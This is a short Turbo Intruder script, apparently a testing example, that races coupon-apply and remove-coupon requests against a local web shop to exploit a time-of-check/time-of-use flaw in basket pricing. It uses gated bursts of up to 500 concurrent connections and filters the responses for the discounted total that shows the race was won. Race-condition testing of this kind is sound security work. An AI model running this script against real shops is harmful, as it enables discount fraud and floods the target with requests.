# This example tries to load the webapplication with a mix of 
# requests where some are the one selected when launching the TurboIntruder
# and some others always sent to the remove-coupon endpoint.
# If the remove-coupon is modified to restore the basket value we can simulate a TOCTOU
#
# Notes:
# - target.req is the target endpoint from where we launched TurboIntruder
# - target.baseInput is the part of the request that was highlighted when we lanunched TurboIntruder
# - target.endpoint is the endpoint relative to the request from where we launched TurboIntruder
# - the values passed to engine.queue and RequestEngine can be hardcoded and don't need to be taken from target necessarily

def queueRequests(target, wordlists):
    remove_request = '''GET /basket/remove-coupon?%s HTTP/1.1
Host: 127.0.0.1:8080

'''


    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=500,
                           requestsPerConnection=100,
                           pipeline=False
                           )

    for _ in range(50):
        for _ in range(10):
            payload = target.baseInput
            engine.queue(target.req, payload, label=payload , gate='race1')

        for _ in range(10):
            payload = target.baseInput
            engine.queue(target.req, payload, label=payload , gate='race2')


        for _ in range(10):
            payload = target.baseInput
            # Queueing a set of requests to the remove-coupon controller
            engine.queue(remove_request, payload, label=payload , gate='race3')


        engine.openGate('race1')
        engine.openGate('race2')
        engine.openGate('race3')

    engine.complete(timeout=60)

# Excluding requests we know we may get. 40.00 when the coupon works just fine; 21.07 when the race condition wins
@FilterRegex(r".*21\.07.*")
@FilterRegex(r".*40\.0.*")
def handleResponse(req, interesting):
    table.add(req)
